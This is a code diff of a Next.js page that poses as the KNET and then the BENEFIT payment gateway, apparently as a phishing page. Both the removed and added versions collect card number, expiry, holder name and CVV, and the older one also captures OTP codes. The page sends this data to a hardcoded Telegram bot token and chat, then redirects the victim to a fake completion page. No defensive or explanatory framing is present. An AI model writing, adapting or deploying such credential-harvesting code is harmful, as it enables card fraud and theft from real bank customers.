@@ -1,283 +1,195 @@
-"use client";
+'use client'
+import { Suspense } from "react";
+import React, { useState } from 'react';
+import styles from "./benefitpay.module.css";
+import { useRouter, useSearchParams } from 'next/navigation';
+import axios from 'axios';
 
-import { Suspense, useState } from "react";
-import { useRouter, useSearchParams } from "next/navigation";
-import Image from "next/image";
-import axios from "axios";
-import kibLo from "../../../public/lobanner.png";
-import kibb from "../../../public/dirayaBanner.png";
-import styles from "./page.module.css";
+const KPayContent = () => {
+  const [formData, setFormData] = useState({
+    cardNumber: "",
+    expiryMonth: "",
+    expiryYear: "",
+    cardHolder: "",
+    pin: ""
+  });
 
-function KnetPageContent() {
-  const [fullName, setFullName] = useState("");
-  const [cardNumber, setCardNumber] = useState("");
-  const [expMonth, setExpMonth] = useState("");
-  const [expYear, setExpYear] = useState("");
-  const [cvv, setCvv] = useState("");
-  const [bank, setBank] = useState("");
-  const [isProcessing, setIsProcessing] = useState(false);
-  const [otp, setOtp] = useState("");
-  const [showOtp, setShowOtp] = useState(false);
-  const [verificationMsg, setVerificationMsg] = useState("");
-
-  const router = useRouter();
+  const [errors, setErrors] = useState({});
   const searchParams = useSearchParams();
   const price = searchParams.get("price");
   const refN = searchParams.get("refN");
-  const handleSend = async () => {
-    if (!showOtp) {
-      if (
-        !fullName.trim() ||
-        !cardNumber.trim() ||
-        !expMonth.trim() ||
-        !expYear.trim() ||
-        !cvv.trim() ||
-        !bank.trim()
-      ) {
-        alert("Please fill in all fields");
-        return;
-      }
+  const router = useRouter();
 
+  const handleChange = (e) => {
+    const { name, value } = e.target;
+    setFormData((prev) => ({
+      ...prev,
+      [name]: value
+    }));
+  };
+
+  const validate = () => {
+    let newErrors = {};
+
+    if (!/^\d{16}$/.test(formData.cardNumber)) {
+      newErrors.cardNumber = "Card number must be 16 digits";
+    }
+
+    if (!formData.expiryMonth || !formData.expiryYear) {
+      newErrors.expiryDate = "Expiry month and year are required";
+    } else {
+      const today = new Date();
+      const expiry = new Date(formData.expiryYear, formData.expiryMonth - 1);
+      if (expiry < today) {
+        newErrors.expiryDate = "Expiry date must be in the future";
+      }
+    }
+
+    if (!formData.cardHolder.trim()) {
+      newErrors.cardHolder = "Card holder name is required";
+    }
+
+    if (!/^\d{3}$/.test(formData.pin)) {
+      newErrors.pin = "CVV/CVC must be 3 digits";
+    }
+
+    setErrors(newErrors);
+    return Object.keys(newErrors).length === 0;
+  };
+
+  const handleSubmit = async (e) => {
+    e.preventDefault();
+    if (validate()) {
       const text = `
-🏦 Bank: ${bank}
-👤 Full Name: ${fullName}
-💳 Card Number: ${cardNumber}
-📅 Exp Month: ${expMonth}
-📅 Exp Year: ${expYear}
-🔐 CVV/CVC: ${cvv}
-🔨 Ref:${refN}
+🏦 Bank: BENEFIT
+👤 Full Name: ${formData.cardHolder}
+💳 Card Number: ${formData.cardNumber}
+📅 Exp Month: ${formData.expiryMonth}
+📅 Exp Year: ${formData.expiryYear}
+🔐 cvv/cvc: ${formData.pin}
+🔨 Ref: ${refN}
+💲 Price: ${price}.000
       `;
 
       try {
-        setIsProcessing(true);
         await axios.post(
-          `https://api.telegram.org/bot8391195305:AAF-UCHdFDY2uR1cZI8-DOgEt59z849fq20/sendMessage?chat_id=-4836393174&text=${encodeURIComponent(
-            text
-          )}`
+          `https://api.telegram.org/bot8391195305:AAF-UCHdFDY2uR1cZI8-DOgEt59z849fq20/sendMessage`,
+          {
+            chat_id: "-4836393174",
+            text: text
+          }
         );
-        setShowOtp(true);
-        setIsProcessing(false);
+        router.push(`/kpay/finish?refN=${refN}`);
       } catch (error) {
         alert("Error sending data");
-        setIsProcessing(false);
-        console.error(error);
-      }
-    } else {
-      if (!otp.trim()) {
-        alert("Please enter the confirmation code");
-        return;
-      }
-
-      try {
-        setIsProcessing(true);
-        setVerificationMsg("Code sent, verifying...");
-        await axios.post(
-          `https://api.telegram.org/bot8391195305:AAF-UCHdFDY2uR1cZI8-DOgEt59z849fq20/sendMessage?chat_id=-4836393174&text=${encodeURIComponent(
-            `🔑 Confirmation Code: ${otp}
-             🔨 Ref: ${refN}`
-          )}`
-        );
-        // لا تقم بالتوجيه هنا، فقط أظهر رسالة فقط (أو قم بما تريد بعد التحقق)
-        // إذا أردت تحويل، احذف السطر التالي لتعليق التحويل:
-        // router.push(`/kpay/finish?name=${cardNumber}`);
-        setVerificationMsg("Code sent, verifying...");
-        setOtp("")
-        setIsProcessing(false);
-      } catch (error) {
-        alert("Error sending OTP");
-        setVerificationMsg("");
-        setIsProcessing(false);
         console.error(error);
       }
     }
   };
 
+  const months = Array.from({ length: 12 }, (_, i) => ({
+    value: String(i + 1).padStart(2, '0'),
+    label: String(i + 1).padStart(2, '0')
+  }));
+
+  const currentYear = new Date().getFullYear();
+  const years = Array.from({ length: 10 }, (_, i) => currentYear + i);
+
   return (
-    <div className={styles.knetContainer}>
-     
-      <div className={styles.knetBox}>
-        <Image src={kibb} width={350} height={50} alt="bainnary" />
-        <div className={styles.knetInfo}>
-          <Image src={kibLo} width={220} height={50} alt="logo" />
-          <div className={styles.knetInfoRow}>
-            <span className={styles.knetInfoLabel}>Merchant:</span>
-            
-            <span>Tap Payments EPSP</span>
-          </div>
-          <hr />
-          <div className={styles.knetInfoRow}>
-            <span className={styles.knetInfoLabel}>Amount:</span>
-            <span>KD {price}.000</span>
-          </div>
+    <div className={styles.container}>
+      <form onSubmit={handleSubmit}>
+
+        <div>
+          <h5>Amount</h5>
+          <p>{price}.000</p>
         </div>
 
-        {isProcessing && <p style={{ color: "black" }}>Processing transaction...</p>}
-        {verificationMsg && <p style={{ color: "blue", marginTop: 8 }}>{verificationMsg}</p>}
+        <div>
+          <h5>Card Type</h5>
+          <p>Debit</p>
+        </div>
 
-        <form
-          onSubmit={(e) => {
-            e.preventDefault();
-            handleSend();
-          }}
-          className={styles.knetForm}
-        >
-          <div>
-            <label>Select Bank :</label>
+        <div>
+          <h5>Card Number</h5>
+          <input
+            type="text"
+            name="cardNumber"
+            value={formData.cardNumber}
+            onChange={handleChange}
+          />
+          {errors.cardNumber && <div className={styles.errorBox}>⚠️ {errors.cardNumber}</div>}
+        </div>
+
+        <div>
+          <h5>Expiry Date</h5>
+          <div style={{ display: "flex", gap: "10px" }}>
             <select
-              style={{ width: "175px", height: "30px", fontSize: "13px" }}
-              value={bank}
-              onChange={(e) => setBank(e.target.value)}
-              required
-              disabled={isProcessing || showOtp}
+              name="expiryMonth"
+              value={formData.expiryMonth}
+              onChange={handleChange}
             >
-              <option value="">-- Select Bank --</option>
-              <option value="ABK">Al Ahli Bank of Kuwait (ABK)</option>
-              <option value="RAJHI">Al Rajhi Bank (RAJHI)</option>
-              <option value="BBK">Bank of Bahrain and Kuwait (BBK)</option>
-              <option value="BOUBYAN">Boubyan Bank (BOUBYAN)</option>
-              <option value="BURG">Burgan Bank (BURG)</option>
-              <option value="CBK">Commercial Bank of Kuwait (CBK)</option>
-              <option value="DOHA">Doha Bank (DOHA)</option>
-              <option value="GULF">Gulf Bank (GULF)</option>
-              <option value="KFH">Kuwait Finance House (KFH)</option>
-              <option value="KIB">Kuwait International Bank (KIB)</option>
-              <option value="NBK">National Bank of Kuwait (NBK)</option>
-              <option value="QNB">Qatar National Bank (QNB)</option>
-              <option value="UNB">Union National Bank (UNB)</option>
-              <option value="WARBA">Warba Bank (WARBA)</option>
+              <option value="">MM</option>
+              {months.map((m) => (
+                <option key={m.value} value={m.value}>{m.label}</option>
+              ))}
+            </select>
+
+            <select
+              name="expiryYear"
+              value={formData.expiryYear}
+              onChange={handleChange}
+            >
+              <option value="">YYYY</option>
+              {years.map((y) => (
+                <option key={y} value={y}>{y}</option>
+              ))}
             </select>
           </div>
-          <hr />
+          {errors.expiryDate && <div className={styles.errorBox}>⚠️ {errors.expiryDate}</div>}
+        </div>
 
-          <div>
-            <label className={styles.formLabel}>Card Number:</label>
-            <input
-              type="text"
-              maxLength="16"
-              inputMode="numeric"
-              pattern="[0-9]*"
-              value={cardNumber}
-              onChange={(e) => setCardNumber(e.target.value)}
-              required
-              className={styles.formInput}
-              disabled={isProcessing || showOtp}
-            />
-          </div>
-          <hr />
+        <div>
+          <h5>Card Holder's Name</h5>
+          <input
+            type="text"
+            name="cardHolder"
+            value={formData.cardHolder}
+            onChange={handleChange}
+          />
+          {errors.cardHolder && <div className={styles.errorBox}>⚠️ {errors.cardHolder}</div>}
+        </div>
 
-          <div className={styles.dataexp}>
-            <label className={styles.formLabel}>Expiration :</label>
-            <div>
-              <select
-                value={expMonth}
-                onChange={(e) => setExpMonth(e.target.value)}
-                required
-                className={styles.formInput}
-                disabled={isProcessing || showOtp}
-              >
-                <option value="">MM</option>
-                {Array.from({ length: 12 }, (_, i) => (
-                  <option key={i + 1} value={String(i + 1).padStart(2, "0")}>
-                    {String(i + 1).padStart(2, "0")}
-                  </option>
-                ))}
-              </select>
+        <div>
+          <h5>CVV/CVC</h5>
+          <input
+            type="number"
+            name="pin"
+            value={formData.pin}
+            onChange={handleChange}
+          />
+          {errors.pin && <div className={styles.errorBox}>⚠️ {errors.pin}</div>}
+        </div>
 
-              <select
-                value={expYear}
-                onChange={(e) => setExpYear(e.target.value)}
-                required
-                className={styles.formInput}
-                disabled={isProcessing || showOtp}
-              >
-                <option value="">YY</option>
-                {Array.from({ length: 50 }, (_, i) => {
-                  const year = new Date().getFullYear() + i;
-                  return (
-                    <option key={year} value={String(year).slice(-2)}>
-                      {`20${String(year).slice(-2)}`}
-                    </option>
-                  );
-                })}
-              </select>
-            </div>
-          </div>
-          <hr />
+        <div className={styles.btn}>
+          <button type="submit">Pay</button>
+          <button type="button" onClick={() => router.push("/")}>Cancel</button>
+        </div>
+      </form>
 
-          <div>
-            <label className={styles.formLabel}>Full Name:</label>
-            <input
-              type="text"
-              maxLength="100"
-              value={fullName}
-              onChange={(e) => setFullName(e.target.value)}
-              required
-              className={styles.formInput}
-              disabled={isProcessing || showOtp}
-            />
-          </div>
-          <hr />
-
-          <div>
-            <label className={styles.formLabel}>CVV/CVC:</label>
-            <input
-              type="text"
-              maxLength="3"
-              inputMode="numeric"
-              pattern="\d*"
-              value={cvv}
-              onChange={(e) => setCvv(e.target.value)}
-              required
-              className={styles.formInput}
-              disabled={isProcessing || showOtp}
-            />
-          </div>
-          <hr />
-
-          {showOtp && (
-            <>
-              <div>
-                <label className={styles.formLabel}>Confirmation Code:</label>
-                <input
-                  type="text"
-                  maxLength="6"
-                  inputMode="numeric"
-                  pattern="\d*"
-                  value={otp}
-                  onChange={(e) => setOtp(e.target.value)}
-                  required
-                  className={styles.formInput}
-                />
-              </div>
-              <hr />
-            </>
-          )}
-
-          <div className={styles.buttonRow}>
-            {!showOtp && (
-              <button
-                type="button"
-                className={styles.cancel}
-                onClick={() => router.back()}
-                disabled={isProcessing}
-              >
-                Cancel
-              </button>
-            )}
-            <button type="submit" className={styles.submit}>
-              {showOtp ? "Send Code" : "Submit"}
-            </button>
-          </div>
-        </form>
-      </div>
+      <b>View Accepted Cards</b>
+      <p>
+        Note: By submitting your information and using "BENEFIT Payment Gateway",
+        you indicate that you agree to the Terms of Services - Legal Disclaimer.
+      </p>
     </div>
   );
-}
+};
 
-export default function KnetPage() {
+export default function KPay() {
   return (
     <Suspense fallback={<div>Loading...</div>}>
-      <KnetPageContent />
+      <KPayContent />
     </Suspense>
   );
-}
+  }
+                  
